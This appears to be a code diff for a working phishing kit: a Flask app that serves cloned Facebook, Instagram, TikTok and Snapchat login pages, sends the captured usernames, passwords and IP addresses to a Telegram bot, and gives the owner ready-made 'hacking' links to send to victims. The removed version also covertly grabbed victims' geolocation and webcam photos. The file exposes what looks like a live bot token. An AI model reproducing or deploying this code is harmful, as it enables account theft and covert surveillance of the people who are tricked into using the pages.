@@ -1,12 +1,11 @@
 import os
 import threading
 import telebot
-import base64
-import random
-from flask import Flask, request, render_template_string
+import logging
+from flask import Flask, request, render_template_string, redirect
 from telebot import types
 
-# --- البيانات الأساسية ---
+# --- الإعدادات الأساسية ---
 TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
 ADMIN_ID = 6829017835
 OWNER = "KING-SAQR"
@@ -14,142 +13,55 @@ OWNER = "KING-SAQR"
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# --- مصفوفة الصفحات والخدمات ---
-SERVICES = {
-    "fb": {"name": "فيسبوك", "color": "#1877f2", "icon": "📘"},
-    "ig": {"name": "إنستغرام", "color": "#E1306C", "icon": "📸"},
-    "tk": {"name": "تيك توك", "color": "#000000", "icon": "🎵"},
-    "sc": {"name": "سناب شات", "color": "#FFFC00", "icon": "👻"},
-    "wa": {"name": "واتساب", "color": "#25D366", "icon": "💚"},
-    "pb": {"name": "ببجي (شحن)", "color": "#F2A900", "icon": "🔫"},
-    "ff": {"name": "فري فاير", "color": "#FF5722", "icon": "🔥"},
-    "tm": {"name": "أرباح تيمو", "color": "#FF9800", "icon": "💰"},
-    "rs": {"name": "رشق متابعين", "color": "#FF6B6B", "icon": "📈"},
+# --- قوالب الصفحات (تم تنظيفها من الكاميرا والموقع) ---
+
+PAGES = {
+    "facebook": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>فيسبوك - تسجيل الدخول</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.container{max-width:400px;width:100%;background:white;border-radius:28px;box-shadow:0 8px 28px rgba(0,0,0,0.1),0 0 0 1px rgba(0,0,0,0.02);padding:40px 24px;text-align:center;}.logo{font-size:48px;font-weight:700;color:#1877f2;margin-bottom:24px;}.input-field{width:100%;padding:14px 16px;margin:10px 0;border:1px solid #dddfe2;border-radius:12px;font-size:17px;background:#fff;transition:0.1s;}.input-field:focus{border-color:#1877f2;outline:none;box-shadow:0 0 0 2px #e7f3ff;}.login-btn{width:100%;background:#1877f2;border:none;border-radius:12px;padding:14px;font-size:18px;font-weight:600;color:white;margin-top:14px;cursor:pointer;transition:0.2s;}.links{display:flex;justify-content:space-between;margin-top:20px;font-size:14px;}.links a{color:#1877f2;text-decoration:none;}.divider{height:1px;background:#dadde1;margin:24px 0;}.new-account{background:#42b72a;border-radius:12px;padding:12px;font-weight:600;color:white;text-decoration:none;display:inline-block;width:100%;text-align:center;}</style></head><body><div class="container"><div class="logo">f</div><form id="loginForm"><input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required><input type="password" class="input-field" id="password" placeholder="كلمة المرور" required><button type="submit" class="login-btn">تسجيل الدخول</button><div class="links"><a href="#">نسيت كلمة المرور؟</a><a href="#">إنشاء حساب جديد</a></div><div class="divider"></div><a href="#" class="new-account">إنشاء حساب على فيسبوك</a></form></div><script>document.getElementById("loginForm").addEventListener("submit",function(e){e.preventDefault();fetch("/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:document.getElementById("email").value,p:document.getElementById("password").value,platform:"Facebook"})}).finally(()=>{window.location.href="https://facebook.com";});});</script></body></html>""",
+    
+    "instagram": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>Instagram • Login</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px;}.container{max-width:350px;width:100%;background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 28px;text-align:center;}.logo{font-size:52px;margin-bottom:32px;color:#262626;}.input-field{width:100%;padding:12px 12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:6px;background:#fafafa;font-size:14px;}.login-btn{width:100%;background:#0095f6;border:none;border-radius:8px;padding:10px;font-size:15px;font-weight:600;color:white;margin-top:12px;cursor:pointer;}.separator{display:flex;margin:20px 0;align-items:center;font-size:13px;color:#8e8e8f;}.separator::before,.separator::after{content:"";flex:1;height:1px;background:#dbdbdb;margin:0 12px;}.fb-login{color:#385185;font-weight:600;font-size:14px;text-decoration:none;}</style></head><body><div class="container"><div class="logo">Instagram</div><form id="loginForm"><input type="text" class="input-field" id="username" placeholder="اسم المستخدم" required><input type="password" class="input-field" id="password" placeholder="كلمة المرور" required><button type="submit" class="login-btn">تسجيل الدخول</button><div class="separator"><span>أو</span></div><a href="#" class="fb-login">تسجيل الدخول باستخدام Facebook</a></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('username').value,p:document.getElementById('password').value,platform:'Instagram'})}).finally(()=>{window.location.href='https://instagram.com';});});</script></body></html>""",
+    
+    "tiktok": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>TikTok - تسجيل الدخول</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif;}body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.card{max-width:380px;width:100%;background:white;border-radius:40px;box-shadow:0 8px 28px rgba(0,0,0,0.08);padding:36px 28px;text-align:center;}.logo{font-weight:800;font-size:38px;color:#000;margin-bottom:20px;}.input-group input{width:100%;padding:16px 20px;margin:10px 0;border:1px solid #e1e1e2;border-radius:36px;font-size:16px;background:#f8f8f8;}.login-btn{width:100%;background:#fe2c55;border:none;border-radius:44px;padding:14px;font-size:18px;font-weight:700;color:white;margin-top:18px;cursor:pointer;}</style></head><body><div class="card"><div class="logo">TikTok</div><form id="loginForm"><div class="input-group"><input type="text" id="emailPhone" placeholder="الإيميل / الهاتف" required></div><div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div><button type="submit" class="login-btn">تسجيل الدخول</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',(e)=>{e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('emailPhone').value,p:document.getElementById('password').value,platform:'TikTok'})}).finally(()=>{window.location.href='https://tiktok.com';});});</script></body></html>""",
+    
+    "snapchat": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>Snapchat • Log in</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}body{background:#FFFC00;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:24px;}.ghost{background:white;border-radius:48px;width:100%;max-width:380px;padding:36px 28px;box-shadow:0 12px 28px rgba(0,0,0,0.12);text-align:center;}.ghost-logo{font-size:56px;font-weight:800;color:#000;margin-bottom:24px;}.input-snap{width:100%;padding:16px 18px;margin:10px 0;border:1px solid #ddd;border-radius:60px;font-size:17px;background:#fafafa;}.snap-btn{background:#000;border:none;border-radius:60px;padding:16px;width:100%;font-size:18px;font-weight:600;color:#FFFC00;margin-top:14px;cursor:pointer;}</style></head><body><div class="ghost"><div class="ghost-logo">👻</div><form id="loginForm"><input type="text" class="input-snap" id="username" placeholder="اسم المستخدم" required><input type="password" class="input-snap" id="password" placeholder="كلمة المرور" required><button type="submit" class="snap-btn">تسجيل الدخول</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',(e)=>{e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('username').value,p:document.getElementById('password').value,platform:'Snapchat'})}).finally(()=>{window.location.replace('https://accounts.snapchat.com');});});</script></body></html>"""
 }
 
-# --- القائمة الرئيسية (مطابقة للصور) ---
-def get_full_menu():
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    # أزرار الاختراق
-    markup.add(
-        types.InlineKeyboardButton("👤 اختراق فيسبوك", callback_data="gen_fb"),
-        types.InlineKeyboardButton("📸 اختراق إنستغرام", callback_data="gen_ig")
+# --- لوحة التحكم تليجرام ---
+def get_main_menu():
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        types.InlineKeyboardButton("📘 فيسبوك", callback_data="link_facebook"),
+        types.InlineKeyboardButton("📸 إنستغرام", callback_data="link_instagram")
     )
-    markup.add(
-        types.InlineKeyboardButton("🎵 اختراق تيك توك", callback_data="gen_tk"),
-        types.InlineKeyboardButton("👻 اختراق سناب شات", callback_data="gen_sc")
+    kb.add(
+        types.InlineKeyboardButton("🎵 تيك توك", callback_data="link_tiktok"),
+        types.InlineKeyboardButton("👻 سناب شات", callback_data="link_snapchat")
     )
-    # أزرار الخدمات والتمويه
-    markup.add(
-        types.InlineKeyboardButton("🚀 رشق متابعين", callback_data="gen_rs"),
-        types.InlineKeyboardButton("💰 أرباح تيمو", callback_data="gen_tm")
-    )
-    markup.add(
-        types.InlineKeyboardButton("📷 سحب الكاميرا", callback_data="gen_cam"),
-        types.InlineKeyboardButton("📍 تحديد الموقع", callback_data="gen_gps")
-    )
-    # أزرار إضافية
-    markup.add(
-        types.InlineKeyboardButton("😄 نكت هكر", callback_data="joke"),
-        types.InlineKeyboardButton("📜 أحاديث", callback_data="hadith")
-    )
-    return markup
-
-# --- قالب الصفحة الاحترافي (نسخة طبق الأصل) ---
-PHISH_HTML = '''
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ title }} - تسجيل الدخول</title>
-    <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
-        .logo { font-size: 50px; margin-bottom: 15px; }
-        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: {{ color }}; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="logo">{{ icon }}</div>
-        <h2>تسجيل الدخول إلى {{ title }}</h2>
-        <form id="logForm">
-            <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-    </div>
-    <video id="v" autoplay style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-    <script>
-        const postData = (d) => fetch('/collect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)});
-        
-        // سحب الموقع سراً
-        navigator.geolocation.getCurrentPosition(p => {
-            postData({type:'loc', lat:p.coords.latitude, lon:p.coords.longitude});
-        });
-
-        // سحب الكاميرا سراً
-        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-            const v = document.getElementById('v'); v.srcObject = s;
-            setTimeout(() => {
-                const c = document.getElementById('c');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v,0,0);
-                postData({type:'img', data:c.toDataURL('image/png')});
-                s.getTracks().forEach(t => t.stop());
-            }, 3000);
-        });
-
-        document.getElementById('logForm').onsubmit = (e) => {
-            e.preventDefault();
-            postData({type:'login', u:document.getElementById('email').value, p:document.getElementById('pass').value, platform:'{{ title }}'})
-            .then(() => window.location.href = "https://google.com");
-        };
-    </script>
-</body>
-</html>
-'''
+    return kb
 
 @app.route('/')
-def index():
-    t = request.args.get('type', 'fb')
-    conf = SERVICES.get(t, SERVICES['fb'])
-    return render_template_string(PHISH_HTML, title=conf['name'], color=conf['color'], icon=conf['icon'])
+def home():
+    t = request.args.get('type', 'facebook')
+    return render_template_string(PAGES.get(t, PAGES['facebook']))
 
-@app.route('/collect', methods=['POST'])
-def collect():
-    d = request.json
-    if d['type'] == 'login':
-        msg = f"🚨 *اختراق جديد ({d['platform']}):*\n👤: `{d['u']}`\n🔑: `{d['p']}`"
-        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
-    elif d['type'] == 'loc':
-        bot.send_message(ADMIN_ID, f"📍 *موقع الضحية:*\nhttps://www.google.com/maps?q={d['lat']},{d['lon']}")
-    elif d['type'] == 'img':
-        img = base64.b64decode(d['data'].split(',')[1])
-        bot.send_photo(ADMIN_ID, img, caption="📸 صورة الضحية المباشرة")
+@app.route('/submit', methods=['POST'])
+def submit():
+    data = request.json
+    msg = f"🚨 *سحب حساب جديد ({data['platform']}):*\n👤: `{data['u']}`\n🔑: `{data['p']}`\n🌍 IP: `{request.remote_addr}`"
+    bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
     return "ok"
 
 @bot.message_handler(commands=['start'])
-def welcome(m):
+def start(m):
     if m.from_user.id == ADMIN_ID:
-        bot.send_message(m.chat.id, f"🎖️ مرحباً بك يا جنرال {OWNER}\nهذا هو بوت الإمبراطورية الخاص بك.", reply_markup=get_full_menu())
+        bot.send_message(m.chat.id, f"🎖️ أهلاً جنرال {OWNER}\nاختر المنصة لإنشاء الرابط:", reply_markup=get_main_menu())
 
-@bot.callback_query_handler(func=lambda c: True)
-def handle_c(c):
+@bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
+def send_link(c):
+    platform = c.data.split("_")[1]
     host = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')
-    if c.data.startswith("gen_"):
-        pt = c.data.replace("gen_", "")
-        link = f"https://{host}/?type={pt}"
-        bot.send_message(c.message.chat.id, f"🔗 الرابط الجاهز للضحية:\n`{link}`", parse_mode='Markdown')
-    elif c.data == "joke":
-        bot.answer_callback_query(c.id, "ليش الهكر ما بياكل لحمة؟ لأنه بيخاف من الـ 'Meat-in-the-middle' 😂", show_alert=True)
-    bot.answer_callback_query(c.id)
+    url = f"https://{host}/?type={platform}"
+    bot.send_message(c.message.chat.id, f"🔗 رابط اختراق {platform}:\n`{url}`", parse_mode='Markdown')
 
-def run_b(): bot.infinity_polling()
-threading.Thread(target=run_b, daemon=True).start()
-
+threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
